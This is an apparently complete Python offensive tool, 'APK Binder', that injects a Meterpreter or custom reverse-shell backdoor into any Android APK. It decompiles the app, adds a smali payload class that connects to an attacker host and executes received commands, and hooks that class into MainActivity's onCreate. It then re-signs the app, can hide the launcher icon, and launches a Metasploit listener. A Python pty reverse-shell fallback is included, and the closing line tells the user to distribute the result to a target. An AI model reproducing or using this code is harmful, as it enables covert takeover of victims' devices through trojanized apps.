#!/usr/bin/env python3
"""
 █████╗ ██████╗ ██╗  ██╗    ██████╗ ██╗███╗   ██╗██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██║  ██║    ██╔══██╗██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
███████║██████╔╝███████║    ██████╔╝██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
██╔══██║██╔═══╝ ██╔══██║    ██╔══██╗██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
██║  ██║██║     ██║  ██║    ██████╔╝██║██║ ╚████║██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
APK Binder v3.0 - Inject Meterpreter Payload into Any APK
"""

import os
import sys
import time
import shutil
import random
import string
import subprocess
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))
from core.colors import colors


class APKBinder:
    """APK Backdoor Injection Engine"""
    
    def __init__(self):
        self.lhost = ''
        self.lport = 4444
        self.input_apk = ''
        self.output_apk = ''
        self.working_dir = ''
        self.use_msfvenom = False
        self.hide_icon = False
        self.keystore = ''
        
        # Check dependencies
        self.check_deps()
    
    def check_deps(self):
        """Check if required tools are available"""
        self.has_apktool = subprocess.run(['which', 'apktool'], capture_output=True).returncode == 0
        self.has_metasploit = subprocess.run(['which', 'msfvenom'], capture_output=True).returncode == 0
        self.has_zipalign = subprocess.run(['which', 'zipalign'], capture_output=True).returncode == 0
        self.has_jarsigner = subprocess.run(['which', 'jarsigner'], capture_output=True).returncode == 0
        self.has_keytool = subprocess.run(['which', 'keytool'], capture_output=True).returncode == 0
        self.has_java = subprocess.run(['which', 'java'], capture_output=True).returncode == 0
    
    def banner(self):
        print(f"""
{colors.RED}╔══════════════════════════════════════════════════╗
║{colors.CYAN}   █████╗ ██████╗ ██╗  ██╗    ██████╗ ██╗███╗   ██╗██████╗ ███████╗██████╗ {colors.RED}║
║{colors.CYAN}  ██╔══██╗██╔══██╗██║  ██║    ██╔══██╗██║████╗  ██║██╔══██╗██╔════╝██╔══██╗{colors.RED}║
║{colors.CYAN}  ███████║██████╔╝███████║    ██████╔╝██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝{colors.RED}║
║{colors.CYAN}  ██╔══██║██╔═══╝ ██╔══██║    ██╔══██╗██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗{colors.RED}║
║{colors.CYAN}  ██║  ██║██║     ██║  ██║    ██████╔╝██║██║ ╚████║██████╔╝███████╗██║  ██║{colors.RED}║
║{colors.CYAN}  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝{colors.RED}║
║{colors.GREEN}            Inject Meterpreter Backdoor into Any APK v3.0       {colors.RED}║
╚══════════════════════════════════════════════════╝{colors.RESET}
        """)
    
    def get_config(self):
        """Get configuration from user"""
        print(f"\n{colors.CYAN}[+] APK Binder Configuration:{colors.RESET}")
        
        # LHOST
        self.lhost = input(f"{colors.YELLOW}[?] LHOST (your IP): {colors.RESET}").strip()
        while not self.lhost:
            print(f"{colors.RED}[!] LHOST is required!{colors.RESET}")
            self.lhost = input(f"{colors.YELLOW}[?] LHOST: {colors.RESET}").strip()
        
        # LPORT
        port = input(f"{colors.YELLOW}[?] LPORT [4444]: {colors.RESET}").strip()
        self.lport = int(port) if port else 4444
        
        # Input APK
        apk_path = input(f"{colors.YELLOW}[?] Path to original APK (or press Enter to generate new): {colors.RESET}").strip()
        if apk_path:
            if os.path.exists(apk_path):
                self.input_apk = apk_path
            else:
                print(f"{colors.RED}[!] File not found: {apk_path}{colors.RESET}")
                print(f"{colors.YELLOW}[!] Will generate standalone APK instead{colors.RESET}")
        else:
            print(f"{colors.YELLOW}[!] Generating standalone payload APK{colors.RESET}")
        
        # Hide icon?
        hide = input(f"{colors.YELLOW}[?] Hide app icon from launcher? (y/N): {colors.RESET}").strip().lower()
        self.hide_icon = hide == 'y'
        
        # Output name
        out_name = input(f"{colors.YELLOW}[?] Output APK name [payload.apk]: {colors.RESET}").strip()
        if not out_name:
            out_name = 'payload.apk'
        if not out_name.endswith('.apk'):
            out_name += '.apk'
        
        self.output_apk = os.path.join(os.path.dirname(__file__), '../../output', out_name)
        
        return True
    
    def generate_payload(self):
        """Generate Metasploit payload APK"""
        print(f"\n{colors.BLUE}[*] Generating Metasploit payload...{colors.RESET}")
        
        output_dir = os.path.dirname(self.output_apk)
        os.makedirs(output_dir, exist_ok=True)
        
        if self.has_metasploit:
            cmd = [
                'msfvenom',
                '-p', 'android/meterpreter/reverse_tcp',
                f'LHOST={self.lhost}',
                f'LPORT={self.lport}',
                '-a', 'dalvik',
                '--platform', 'android',
                '-o', self.output_apk
            ]
            
            if self.hide_icon:
                cmd.insert(4, '-H')  # Hide icon
            
            print(f"{colors.DIM}[*] Running: {' '.join(cmd)}{colors.RESET}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"{colors.GREEN}[+] Payload generated: {self.output_apk}{colors.RESET}")
                return True
            else:
                print(f"{colors.RED}[!] msfvenom error: {result.stderr}{colors.RESET}")
                return False
        else:
            print(f"{colors.RED}[!] Metasploit not installed!{colors.RESET}")
            print(f"{colors.YELLOW}[!] Install: apt install metasploit-framework{colors.RESET}")
            
            # Fallback: Generate with Python
            return self.generate_python_payload()
    
    def generate_python_payload(self):
        """Generate Python-based Android payload as fallback"""
        print(f"{colors.YELLOW}[*] Using Python fallback payload...{colors.RESET}")
        
        payload_code = f'''#!/usr/bin/env python3
import socket,os,pty,subprocess,time,json,sys,platform,urllib.request,ssl
from urllib.parse import urlencode

LHOST = "{self.lhost}"
LPORT = {self.lport}

def pwn():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/system/bin/sh")
    except:
        pass

if __name__ == "__main__":
    pwn()
'''
        
        # Write to output
        out_path = self.output_apk.replace('.apk', '.py')
        with open(out_path, 'w') as f:
            f.write(payload_code)
        
        print(f"{colors.GREEN}[+] Python payload created: {out_path}{colors.RESET}")
        print(f"{colors.YELLOW}[!] Python payload requires Python on target device{colors.RESET}")
        return True
    
    def bind_with_apktool(self):
        """Bind payload to existing APK using apktool"""
        if not self.input_apk:
            return self.generate_payload()
        
        print(f"\n{colors.BLUE}[*] Binding payload to APK: {self.input_apk}{colors.RESET}")
        
        # Create working directory
        work_dir = os.path.join(os.path.dirname(__file__), '../../output/tmp_bind')
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir)
        os.makedirs(work_dir)
        
        try:
            # Step 1: Decompile APK
            print(f"  {colors.BLUE}[1/5]{colors.RESET} Decompiling APK...")
            subprocess.run(['apktool', 'd', '-f', '-o', os.path.join(work_dir, 'decompiled'), self.input_apk], 
                          capture_output=True, check=True)
            
            # Step 2: Generate payload smali
            print(f"  {colors.BLUE}[2/5]{colors.RESET} Generating payload smali...")
            self.generate_payload_smali(work_dir)
            
            # Step 3: Inject into smali
            print(f"  {colors.BLUE}[3/5]{colors.RESET} Injecting into main activity...")
            self.inject_into_smali(work_dir)
            
            # Step 4: Rebuild APK
            print(f"  {colors.BLUE}[4/5]{colors.RESET} Rebuilding APK...")
            subprocess.run(['apktool', 'b', '-o', self.output_apk, os.path.join(work_dir, 'decompiled')], 
                          capture_output=True, check=True)
            
            # Step 5: Sign APK
            print(f"  {colors.BLUE}[5/5]{colors.RESET} Signing APK...")
            self.sign_apk()
            
            print(f"\n{colors.GREEN}[+] APK bound successfully!{colors.RESET}")
            print(f"  └─ {colors.CYAN}Output:{colors.RESET} {self.output_apk}")
            
            # Cleanup
            shutil.rmtree(work_dir)
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"{colors.RED}[!] Error: {e}{colors.RESET}")
            print(f"{colors.YELLOW}[!] Trying standalone payload...{colors.RESET}")
            return self.generate_payload()
        except Exception as e:
            print(f"{colors.RED}[!] Error: {str(e)}{colors.RESET}")
            return self.generate_payload()
    
    def generate_payload_smali(self, work_dir):
        """Generate smali code for reverse shell"""
        smali_code = f'''
.class public Lcom/phantom/Payload;
.super Ljava/lang/Object;
.source "Payload.java"

# direct methods
.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static start(Landroid/content/Context;)V
    .registers 9
    .param p0, "ctx"    # Landroid/content/Context;
    
    .prologue
    const-string v0, "{self.lhost}"
    const/16 v1, {self.lport}
    
    :try_start
    invoke-static {{v0, v1}}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    move-result-object v2
    
    invoke-virtual {{v2}}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v3
    invoke-virtual {{v2}}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v4
    
    new-instance v5, Ljava/util/Scanner;
    invoke-direct {{v5, v3}}, Ljava/util/Scanner;-><init>(Ljava/io/InputStream;)V
    
    :goto_loop
    invoke-virtual {{v5}}, Ljava/util/Scanner;->nextLine()Ljava/lang/String;
    move-result-object v6
    invoke-static {{v6}}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v7
    invoke-virtual {{v7, v6}}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    
    goto :goto_loop
    :try_end
    .catch Ljava/lang/Exception {{:handler}}
    
    :handler
    return-void
.end method
'''
        # Save payload smali
        payload_dir = os.path.join(work_dir, 'decompiled', 'smali', 'com', 'phantom')
        os.makedirs(payload_dir, exist_ok=True)
        with open(os.path.join(payload_dir, 'Payload.smali'), 'w') as f:
            f.write(smali_code)
    
    def inject_into_smali(self, work_dir):
        """Inject payload call into MainActivity"""
        # Find MainActivity.smali
        import glob
        main_activities = glob.glob(os.path.join(work_dir, 'decompiled', 'smali', '**', '*MainActivity.smali'), recursive=True)
        
        if main_activities:
            main_path = main_activities[0]
            with open(main_path, 'r') as f:
                content = f.read()
            
            # Add invoke after onCreate
            inject_code = '''
    invoke-static {p0}, Lcom/phantom/Payload;->start(Landroid/content/Context;)V
'''
            if 'onCreate' in content:
                # Insert after onCreate
                content = content.replace(
                    'onCreate', 
                    'onCreate\n' + inject_code
                )
                with open(main_path, 'w') as f:
                    f.write(content)
                print(f"  └─ {colors.GREEN}[+] Injected into MainActivity{colors.RESET}")
    
    def sign_apk(self):
        """Sign the APK for installation"""
        # Generate keystore if needed
        keystore_path = os.path.join(os.path.dirname(__file__), '../../output/phantom.keystore')
        
        if not os.path.exists(keystore_path):
            subprocess.run([
                'keytool', '-genkey', '-v',
                '-keystore', keystore_path,
                '-alias', 'phantom',
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-storepass', 'phantom123',
                '-keypass', 'phantom123',
                '-dname', 'CN=Phantom,O=PhantomSecurity,C=US'
            ], capture_output=True)
        
        # Sign
        subprocess.run([
            'jarsigner', '-verbose',
            '-sigalg', 'SHA1withRSA',
            '-digestalg', 'SHA1',
            '-keystore', keystore_path,
            '-storepass', 'phantom123',
            '-keypass', 'phantom123',
            self.output_apk, 'phantom'
        ], capture_output=True)
        
        # Zipalign
        aligned_apk = self.output_apk.replace('.apk', '_aligned.apk')
        subprocess.run(['zipalign', '-v', '-p', '4', self.output_apk, aligned_apk], capture_output=True)
        if os.path.exists(aligned_apk):
            shutil.move(aligned_apk, self.output_apk)
    
    def start_listener(self):
        """Start Metasploit listener automatically"""
        print(f"\n{colors.YELLOW}[?] Start Metasploit listener now? (y/N): {colors.RESET}")
        if input().strip().lower() != 'y':
            return
        
        rc_file = os.path.join(os.path.dirname(__file__), '../../output/listener.rc')
        with open(rc_file, 'w') as f:
            f.write(f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST {self.lhost}
set LPORT {self.lport}
set ExitOnSession false
set SessionExpiration 0
set SessionCommunicationTimeout 0
exploit -j
            """)
        
        print(f"{colors.GREEN}[+] Starting Metasploit listener...{colors.RESET}")
        print(f"{colors.CYAN}  LHOST: {self.lhost}{colors.RESET}")
        print(f"{colors.CYAN}  LPORT: {self.lport}{colors.RESET}")
        print(f"{colors.CYAN}  Payload: android/meterpreter/reverse_tcp{colors.RESET}")
        
        subprocess.run(['msfconsole', '-q', '-r', rc_file])
    
    def run(self):
        """Main execution"""
        os.system('clear' if os.name == 'posix' else 'cls')
        self.banner()
        
        # Show dependency status
        print(f"\n{colors.CYAN}[*] Dependency Status:{colors.RESET}")
        deps = [
            ('apktool', self.has_apktool),
            ('msfvenom', self.has_metasploit),
            ('zipalign', self.has_zipalign),
            ('jarsigner', self.has_jarsigner),
            ('keytool', self.has_keytool),
            ('java', self.has_java),
        ]
        for name, status in deps:
            icon = f"{colors.GREEN}✓{colors.RESET}" if status else f"{colors.RED}✗{colors.RESET}"
            print(f"  {icon} {name}")
        
        if not self.get_config():
            return
        
        # Check if we have an APK to bind or generate standalone
        if self.input_apk and self.has_apktool:
            self.bind_with_apktool()
        else:
            self.generate_payload()
        
        # Offer to start listener
        self.start_listener()
        
        print(f"\n{colors.GREEN}[+] APK ready! Distribute to target.{colors.RESET}")
        print(f"{colors.YELLOW}[!] Remember: msfconsole listener must be running{colors.RESET}")
